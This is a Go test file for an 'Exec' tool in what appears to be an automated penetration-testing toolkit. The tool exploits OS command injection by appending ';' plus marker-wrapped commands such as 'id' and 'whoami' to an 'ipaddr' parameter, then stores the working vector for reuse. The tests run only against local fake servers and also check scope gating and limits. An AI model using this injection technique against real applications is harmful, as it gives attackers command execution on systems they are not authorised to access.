package tools

import (
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"testing"
	"time"
)

// execFakeServer mimics an application that executes its injected input:
// it reads the `ipaddr` parameter (the marker-wrapped payload) and renders
// an HTML page carrying the markers around the canned output `out`. Every
// request is recorded as "METHOD<TAB>payload<TAB>cookie".
func execFakeServer(t *testing.T, out string, rec *[]string) *httptest.Server {
	t.Helper()
	var mu sync.Mutex
	re := regexp.MustCompile(`MOLE-[0-9a-f]{16}-BEGIN`)
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		val := r.URL.Query().Get("ipaddr")
		if val == "" {
			b, _ := io.ReadAll(r.Body)
			v, _ := url.ParseQuery(string(b))
			val = v.Get("ipaddr")
		}
		token := re.FindString(val)
		end := strings.Replace(token, "BEGIN", "END", 1)
		mu.Lock()
		*rec = append(*rec, r.Method+"\t"+val+"\t"+r.Header.Get("Cookie"))
		mu.Unlock()
		fmt.Fprint(w, "<html><body><pre>PING 127.0.0.1: 4 data bytes\n"+token+"\n"+out+"\n"+end+"\n1 packet transmitted</pre></body></html>")
	}))
}

func TestExecRegistryGating(t *testing.T) {
	led, kb := newLedger(t), newKB()
	if registered(NewRegistry(false, led, kb), "exec") {
		t.Fatal("exec registered for a reconnaissance engagement")
	}
	if !registered(NewRegistry(true, led, kb), "exec") {
		t.Fatal("exec not registered for a vulnerability-scanning engagement")
	}
}

func TestExecRegisterAndReuse(t *testing.T) {
	const ident = "uid=33(www-data) gid=33(www) groups=33(www)"
	var rec []string
	srv := execFakeServer(t, ident, &rec)
	defer srv.Close()
	s := testScope("127.0.0.1")
	led := newLedger(t)
	e := &Exec{L: led}

	res := e.Run(testCtx, s, map[string]any{
		"command": "id", "url": srv.URL, "method": "POST",
		"param": "ipaddr", "separator": ";", "value": "127.0.0.1",
	})
	if !res.Allowed {
		t.Fatalf("registration denied: %s", res.Reason)
	}
	pl := res.Payload.(map[string]any)
	if pl["output"] != ident {
		t.Fatalf("unexpected output: %v", pl["output"])
	}
	if _, ok := pl["registered"]; !ok {
		t.Fatal("registration note missing")
	}
	if fid, ok := pl["finding"].(string); !ok || fid == "" {
		t.Fatal("no ledger finding ID recorded for the foothold")
	}
	first := strings.SplitN(rec[0], "\t", 2)[1]
	for _, part := range []string{"127.0.0.1;echo MOLE-", "-BEGIN; id 2>&1; echo MOLE-", "-END"} {
		if !strings.Contains(first, part) {
			t.Fatalf("payload missing %q: %s", part, first)
		}
	}

	// Reuse: command only — the stored vector is reused, nothing re-registered.
	res = e.Run(testCtx, s, map[string]any{"command": "whoami"})
	if !res.Allowed {
		t.Fatalf("reuse denied: %s", res.Reason)
	}
	pl = res.Payload.(map[string]any)
	if pl["output"] != ident {
		t.Fatalf("reuse output: %v", pl["output"])
	}
	if _, ok := pl["registered"]; ok {
		t.Fatal("second call must not re-register the vector")
	}
	second := strings.SplitN(rec[1], "\t", 2)[1]
	if !strings.Contains(second, "-BEGIN; whoami 2>&1; echo MOLE-") {
		t.Fatalf("reuse payload: %s", second)
	}
	if n := len(led.Findings()); n != 1 {
		t.Fatalf("want exactly 1 ledger finding, got %d", n)
	}
}

func TestExecGETAndHeaders(t *testing.T) {
	var rec []string
	srv := execFakeServer(t, "uid=0(root)", &rec)
	defer srv.Close()
	s := testScope("127.0.0.1")
	e := &Exec{}

	res := e.Run(testCtx, s, map[string]any{
		"command": "id", "url": srv.URL, "method": "GET",
		"param": "ipaddr", "separator": ";",
		"headers": map[string]any{"Cookie": "PHPSESSID=abc"},
	})
	if !res.Allowed {
		t.Fatalf("denied: %s", res.Reason)
	}
	entry := rec[0]
	if !strings.HasPrefix(entry, "GET\t") {
		t.Fatalf("not a GET request: %s", entry)
	}
	fields := strings.SplitN(entry, "\t", 3)
	if !strings.Contains(fields[1], ";echo MOLE-") {
		t.Fatalf("payload not in query: %s", fields[1])
	}
	if fields[2] != "PHPSESSID=abc" {
		t.Fatalf("cookie header not sent: %q", fields[2])
	}
}

func TestExecFields(t *testing.T) {
	// The endpoint only runs its command when the submit button is posted
	// too — verify the vector's extra form fields reach the server.
	got := make(chan url.Values, 1)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		v, _ := url.ParseQuery(string(b))
		got <- v
		fmt.Fprint(w, "<pre>ok</pre>")
	}))
	defer srv.Close()
	s := testScope("127.0.0.1")
	e := &Exec{}

	res := e.Run(testCtx, s, map[string]any{
		"command": "id", "url": srv.URL, "method": "POST",
		"param": "ipaddr", "separator": ";",
		"fields": map[string]any{"Submit": "Submit"},
	})
	if !res.Allowed {
		t.Fatalf("denied: %s", res.Reason)
	}
	v := <-got
	if v.Get("Submit") != "Submit" {
		t.Fatalf("extra form field not sent: %v", v)
	}
	if !strings.Contains(v.Get("ipaddr"), ";echo MOLE-") {
		t.Fatalf("injectable param missing payload: %q", v.Get("ipaddr"))
	}
}

func TestExecExtraction(t *testing.T) {
	const out = "uid=0(root) gid=0(root)\n-rw-r--r-- 1 root root 29 Nov  9 2022 /etc/passwd"
	var rec []string
	srv := execFakeServer(t, out, &rec)
	defer srv.Close()
	s := testScope("127.0.0.1")
	e := &Exec{}

	res := e.Run(testCtx, s, map[string]any{"command": "id", "url": srv.URL, "param": "ipaddr", "separator": ";"})
	if !res.Allowed {
		t.Fatalf("denied: %s", res.Reason)
	}
	if pl := res.Payload.(map[string]any); pl["output"] != out {
		t.Fatalf("extraction: %q", pl["output"])
	}
}

func TestExecRegistrationVerifiesBeforeLockIn(t *testing.T) {
	// A vector that does not execute (here: the app demands a session
	// cookie) must not lock in, and a corrected second call must register.
	re := regexp.MustCompile(`MOLE-[0-9a-f]{16}-BEGIN`)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		v, _ := url.ParseQuery(string(b))
		val := v.Get("ipaddr")
		if r.Header.Get("Cookie") != "PHPSESSID=good" {
			fmt.Fprint(w, "<html><body>login form</body></html>")
			return
		}
		token := re.FindString(val)
		end := strings.Replace(token, "BEGIN", "END", 1)
		fmt.Fprint(w, "<pre>"+token+"\nuid=33(www-data)\n"+end+"</pre>")
	}))
	defer srv.Close()
	s := testScope("127.0.0.1")
	led := newLedger(t)
	e := &Exec{L: led}

	res := e.Run(testCtx, s, map[string]any{
		"command": "id", "url": srv.URL, "method": "POST",
		"param": "ipaddr", "separator": ";",
	})
	if !res.Allowed {
		t.Fatalf("denied: %s", res.Reason)
	}
	if !strings.Contains(res.Reason, "NOT registered") {
		t.Fatalf("failed verification should not fix the vector: %q", res.Reason)
	}
	if n := len(led.Findings()); n != 0 {
		t.Fatalf("failed registration recorded %d ledger finding(s)", n)
	}

	// Corrected vector (authenticated session) now registers.
	res = e.Run(testCtx, s, map[string]any{
		"command": "id", "url": srv.URL, "method": "POST",
		"param": "ipaddr", "separator": ";",
		"headers": map[string]any{"Cookie": "PHPSESSID=good"},
	})
	if !res.Allowed {
		t.Fatalf("retry denied: %s", res.Reason)
	}
	pl := res.Payload.(map[string]any)
	if pl["output"] != "uid=33(www-data)" {
		t.Fatalf("retry output: %v", pl["output"])
	}
	if _, ok := pl["registered"]; !ok {
		t.Fatal("corrected registration note missing")
	}
	if n := len(led.Findings()); n != 1 {
		t.Fatalf("want 1 ledger finding after verified registration, got %d", n)
	}
}

func TestExecFallbackWithoutMarkers(t *testing.T) {
	body := "nothing to see here" + strings.Repeat("x", 10000)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, body)
	}))
	defer srv.Close()
	s := testScope("127.0.0.1")
	e := &Exec{}

	res := e.Run(testCtx, s, map[string]any{"command": "id", "url": srv.URL, "param": "ipaddr", "separator": ";"})
	if !res.Allowed {
		t.Fatalf("denied: %s", res.Reason)
	}
	pl := res.Payload.(map[string]any)
	if len(pl["output"].(string)) != execOutputCap {
		t.Fatalf("fallback output length %d, want %d", len(pl["output"].(string)), execOutputCap)
	}
	if !strings.Contains(res.Reason, "no markers") {
		t.Fatalf("expected a no-markers note, got %q", res.Reason)
	}
}

func TestExecScopeGate(t *testing.T) {
	var rec []string
	srv := execFakeServer(t, "uid=0(root)", &rec)
	defer srv.Close()
	s := testScope("other.example")
	e := &Exec{}

	res := e.Run(testCtx, s, map[string]any{"command": "id", "url": srv.URL, "param": "ipaddr", "separator": ";"})
	if res.Allowed {
		t.Fatal("out-of-scope vector registration allowed")
	}
	if len(rec) != 0 {
		t.Fatal("request must not be sent to an out-of-scope target")
	}
}

func TestExecMissingVector(t *testing.T) {
	s := testScope("127.0.0.1")
	e := &Exec{}

	res := e.Run(testCtx, s, map[string]any{"command": "id"})
	if res.Allowed {
		t.Fatal("command-only call before registration allowed")
	}
	if !strings.Contains(res.Reason, "first call") {
		t.Fatalf("reason: %q", res.Reason)
	}

	res = e.Run(testCtx, s, map[string]any{"url": "http://127.0.0.1:8088/", "param": "ipaddr"})
	if res.Allowed {
		t.Fatal("vector without separator allowed")
	}

	res = e.Run(testCtx, s, map[string]any{"command": "id", "url": "http://127.0.0.1:8088/", "param": "ipaddr", "separator": ";", "method": "PUT"})
	if res.Allowed {
		t.Fatal("non GET/POST method allowed")
	}
}

func TestExecCommandCap(t *testing.T) {
	var rec []string
	srv := execFakeServer(t, "uid=0(root)", &rec)
	defer srv.Close()
	s := testScope("127.0.0.1")
	e := &Exec{}

	res := e.Run(testCtx, s, map[string]any{"command": strings.Repeat("a", execCommandCap+1), "url": srv.URL, "param": "ipaddr", "separator": ";"})
	if res.Allowed {
		t.Fatal("over-long command allowed")
	}
	if len(rec) != 0 {
		t.Fatal("request sent for an over-long command")
	}
}

func TestExecTimeoutClamp(t *testing.T) {
	for seconds, want := range map[int]time.Duration{
		0:   30 * time.Second,
		-5:  30 * time.Second,
		1:   1 * time.Second,
		30:  30 * time.Second,
		60:  60 * time.Second,
		999: 60 * time.Second,
	} {
		if got := execTimeout(seconds); got != want {
			t.Fatalf("execTimeout(%d) = %s, want %s", seconds, got, want)
		}
	}
}

func TestExecExtractMarked(t *testing.T) {
	got := extractMarked("junk MOLE-x-BEGIN\nhi there\nMOLE-x-END junk", "MOLE-x-BEGIN", "MOLE-x-END")
	if got != "hi there" {
		t.Fatalf("extraction: %q", got)
	}
	if got := extractMarked("no markers at all", "MOLE-x-BEGIN", "MOLE-x-END"); got != "" {
		t.Fatalf("begin missing: %q", got)
	}
	if got := extractMarked("MOLE-x-BEGIN only", "MOLE-x-BEGIN", "MOLE-x-END"); got != "" {
		t.Fatalf("end missing: %q", got)
	}
}
